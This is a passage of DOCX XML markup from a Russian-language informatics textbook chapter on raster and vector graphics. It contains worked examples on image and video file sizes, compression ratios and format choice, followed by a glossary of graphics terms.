      <w:r>
        <w:t xml:space="preserve"> Несжатое изображение Full HD (1920×1080) в True Color занимает примерно </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>5,93 МБ</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 2: Изображение с альфа-каналом</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Рассчитайте объём изображения разрешением 800×600 пикселей с глубиной цвета 32 бита (24 бита RGB + 8 бит альфа-канал).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>V = (W × H × D) / 8</w:t>
        <w:br/>
        <w:t>V = (800 × 600 × 32) / 8</w:t>
        <w:br/>
        <w:t>V = (480 000 × 32) / 8</w:t>
        <w:br/>
        <w:t>V = 15 360 000 / 8</w:t>
        <w:br/>
        <w:t>V = 1 920 000 байт</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Переведём в мегабайты:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>V = 1 920 000 / (1024 × 1024)</w:t>
        <w:br/>
        <w:t>V ≈ 1,83 МБ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Изображение 800×600 с прозрачностью (32 бита) занимает </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1,83 МБ</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 3: Сравнение глубины цвета</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Сравните объёмы изображения 1024×768 при разной глубине цвета:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>a) 8 бит (256 цветов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>b) 16 бит (High Color)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>c) 24 бит (True Color)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>a) Глубина 8 бит:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>V = (1024 × 768 × 8) / 8 = 786 432 байт ≈ 768 КБ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>b) Глубина 16 бит:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>V = (1024 × 768 × 16) / 8 = 1 572 864 байт ≈ 1,5 МБ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>c) Глубина 24 бит:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>V = (1024 × 768 × 24) / 8 = 2 359 296 байт ≈ 2,25 МБ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>8 бит: 768 КБ (в 3 раза меньше True Color)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>16 бит: 1,5 МБ (в 1,5 раза меньше True Color)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>24 бит: 2,25 МБ (эталон)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Уменьшение глубины цвета уменьшает объём пропорционально, но снижает качество цветопередачи.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 4: Эффективность сжатия JPEG</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Фотография разрешением 4000×3000 пикселей в формате JPEG при качестве 85% занимает 2,1 МБ. Рассчитайте:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>a) Объём несжатого изображения (24 бита)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>b) Коэффициент сжатия</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>a) Объём несжатого:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>V_несж = (4000 × 3000 × 24) / 8 = 36 000 000 байт</w:t>
        <w:br/>
        <w:t>V_несж = 36 000 000 / (1024 × 1024) ≈ 34,33 МБ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>b) Коэффициент сжатия:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>K = V_несж / V_сж = 34,33 / 2,1 ≈ 16,35</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Несжатое изображение занимает 34,33 МБ, JPEG-сжатие даёт коэффициент </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>16,35×</w:t>
      </w:r>
      <w:r>
        <w:t>, то есть файл в 16 раз меньше несжатого.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 5: PNG против BMP</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Скриншот рабочего стола 1920×1080 сохранён в формате BMP и занимает 6,2 МБ. После конвертации в PNG размер стал 1,8 МБ. Рассчитайте коэффициент сжатия PNG.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>K = V_BMP / V_PNG = 6,2 / 1,8 ≈ 3,44</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> PNG сжал изображение примерно в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>3,44 раза</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> без потери качества.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Объяснение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Скриншоты обычно содержат много повторяющихся областей (фон, панели интерфейса), что хорошо сжимается алгоритмом Deflate в PNG.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 6: Выбор формата для разных задач</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Выберите оптимальный формат для следующих изображений:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>a) Логотип компании с прозрачностью для сайта</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>b) Фотография пейзажа для блога</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>c) Анимированный баннер для старого сайта</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>d) Чертёж для печати в типографии</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">a) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Логотип с прозрачностью для сайта:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Лучший вариант: **SVG** (векторный, масштабируемый, малый размер)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Альтернатива: **PNG** (если логотип содержит растровые эффекты)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Обоснование: SVG идеален для логотипов, так как обеспечивает идеальное качество на любых экранах (Retina, 4K) при минимальном размере файла.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">b) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Фотография пейзажа для блога:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Лучший вариант: **JPEG** (качество 80–85%)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Современная альтернатива: **WebP** (если браузеры поддерживают)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Обоснование: JPEG оптимален для фотографий с плавными переходами, даёт хорошее сжатие при приемлемом качестве.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">c) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Анимированный баннер:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Старый стандарт: **GIF** (для совместимости со старыми браузерами)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Современный вариант: **WebP** (анимация) или **видео-формат** (MP4)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Обоснование: GIF устарел, но поддерживается везде. WebP даёт лучшее качество и меньший размер.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">d) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Чертёж для печати:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Лучший вариант: **PDF** (векторный режим) или **EPS**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Альтернатива: **TIFF** (если требуется растр высокого разрешения)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Обоснование: Векторные форматы обеспечивают идеальное качество печати на любом оборудовании, а TIFF — профессиональный стандарт полиграфии для растровых изображений.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 7: Расчёт объёма видеоданных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Несжатое видео разрешением 1280×720 пикселей, 30 кадров в секунду, глубина цвета 24 бита, длительность 1 минута. Рассчитайте объём несжатого видео.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Шаг 1: Объём одного кадра:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>V_кадра = (1280 × 720 × 24) / 8 = 2 764 800 байт</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Шаг 2: Количество кадров за 1 минуту:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>N = 30 кадров/сек × 60 сек = 1800 кадров</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Шаг 3: Общий объём:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>V = V_кадра × N = 2 764 800 × 1800 = 4 976 640 000 байт</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Переведём в гигабайты:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>V = 4 976 640 000 / (1024 × 1024 × 1024) ≈ 4,63 ГБ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Одна минута несжатого HD-видео (720p, 30 fps) занимает </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>4,63 ГБ</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Практическое следствие:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Видео необходимо сжимать. Современные кодеки (H.264, H.265/HEVC) сжимают видео в 50–200 раз, уменьшая файл до 50–100 МБ на минуту при хорошем качестве.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Практическое значение и применение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>В веб-разработке</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Выбор правильного формата изображений критически важен для скорости загрузки сайта:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Логотипы, иконки: SVG (масштабируются, малый размер)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Фотографии: JPEG или WebP с оптимизацией</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Изображения с прозрачностью: PNG или WebP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Адаптивные изображения: несколько версий разного разрешения для разных устройств</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>В графическом дизайне</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Работа в векторных форматах (AI, SVG) для логотипов и иллюстраций</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Растровые форматы высокого разрешения (TIFF, PSD) для обработки фотографий</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Экспорт в соответствующие форматы для разных целей (печать, веб, социальные сети)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>В полиграфии</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>CMYK цветовая модель обязательна для печати</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Высокое разрешение: обычно 300 dpi (dots per inch) для качественной печати</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Форматы: TIFF, PDF, EPS</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>В медицине</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>DICOM — специализированный формат для медицинских изображений (рентген, КТ, МРТ)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>16-битная глубина цвета (grayscale) для точной диагностики</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сжатие без потерь обязательно</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>В компьютерном зрении и машинном обучении</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Обработка растровых изображений для распознавания объектов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Обучение нейронных сетей на больших наборах изображений</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Предобработка: изменение разрешения, нормализация цветов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Связь с другими темами</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Изученная в этой главе тема тесно связана с:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 1.1**: Арифметика в двоичной системе — основа хранения цветовых значений RGB в битах</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 1.2**: Представление данных в памяти ЭВМ — организация хранения пикселей в памяти, адресация</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 1.5**: Меры информации — расчёты объёмов графических файлов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 1.12**: Способы сжатия информации — алгоритмы сжатия графики (Deflate для PNG, DCT для JPEG, LZW для GIF)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Раздел 8**: Локальные и глобальные сети — передача графических данных по сети, оптимизация для веб</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Ключевые термины и определения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Растровая графика</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — способ представления изображения в виде прямоугольной сетки пикселей, каждый из которых имеет определённый цвет.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Векторная графика</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — способ представления изображения в виде математических объектов (примитивов): линий, кривых, многоугольников.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пиксель</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — минимальный элемент растрового изображения, обладающий определённым цветом.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Разрешение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — количество пикселей в изображении, обычно записывается как ширина × высота (например, 1920×1080).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Глубина цвета</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (битовая глубина) — количество бит, используемых для хранения цвета одного пикселя.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>RGB</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — аддитивная цветовая модель, основанная на смешении красного (Red), зелёного (Green) и синего (Blue) цветов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>CMYK</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — субтрактивная цветовая модель, используемая в полиграфии, основанная на смешении голубого (Cyan), пурпурного (Magenta), жёлтого (Yellow) и чёрного (blacK) цветов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Альфа-канал</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — дополнительный канал в изображении, определяющий уровень прозрачности каждого пикселя.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>True Color</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — режим цветопередачи с глубиной 24 бита (по 8 бит на каждый из трёх каналов RGB), обеспечивающий 16 777 216 различных цветов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сжатие без потерь</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (lossless) — метод сжатия данных, при котором исходное изображение может быть точно восстановлено из сжатого.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сжатие с потерями</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (lossy) — метод сжатия данных, при котором часть информации теряется безвозвратно для достижения большего коэффициента сжатия.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Растеризация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — процесс преобразования векторного изображения в растровое.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Контрольные вопросы для самопроверки</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
